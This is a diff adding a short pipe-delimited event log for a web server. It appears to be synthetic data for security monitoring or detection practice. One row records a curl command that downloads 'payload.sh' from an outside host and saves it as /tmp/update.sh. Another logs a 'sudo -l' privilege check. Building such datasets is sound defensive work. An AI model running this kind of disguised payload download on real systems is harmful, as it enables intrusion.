@@ -1,0 +1,5 @@
+Message|Time|SourceIP|Host|Command|User
+software event|11:00:01|198.51.100.77|linux-web-01|curl http://198.51.100.200/payload.sh -o /tmp/update.sh|user
+account check|11:01:01|198.51.100.77|linux-web-01|sudo -l|user
+script event|11:02:01|198.51.100.77|linux-web-01|python3 /opt/backup.py|user
+service event|11:03:01|198.51.100.77|linux-web-01|systemctl restart nginx|user
